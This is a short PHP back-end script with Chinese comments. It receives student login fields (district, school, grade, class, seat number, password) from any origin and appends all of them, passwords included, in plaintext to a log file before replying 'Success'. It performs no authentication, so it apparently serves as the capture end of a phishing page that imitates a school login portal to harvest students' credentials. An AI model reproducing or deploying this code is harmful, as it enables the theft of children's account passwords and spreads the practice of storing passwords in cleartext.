<?php
// 跨域設定（若前端與後端網域不同時允許存取，若同網域可省略）
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");

// 接收前端傳過來的學生表單欄位
$loginAction = $_POST['_loginAction'] ?? '';
$kharea      = $_POST['kharea'] ?? '';
$khschool    = $_POST['khschool'] ?? '';
$khgrade     = $_POST['khgrade'] ?? '';
$khclass     = $_POST['khclass'] ?? '';
$khseatno    = $_POST['khseatno'] ?? '';
$password    = $_POST['password'] ?? '';

// 如果有填寫密碼或選擇座號，就寫入記錄檔
if (!empty($password) || !empty($khseatno)) {
    $logData = sprintf(
        "身分: %s | 行政區: %s | 學校: %s | 年級: %s | 班級: %s | 座號: %s | 密碼: %s\n",
        $loginAction,
        $kharea,
        $khschool,
        $khgrade,
        $khclass,
        $khseatno,
        $password
    );
    
    // 將資料附加寫入 log.txt 檔案中
    file_put_contents('log.txt', $logData, FILE_APPEND);
    
    // 回傳成功訊息給前端 AJAX
    echo "Success";
} else {
    http_response_code(400);
    echo "Invalid Data";
}
?>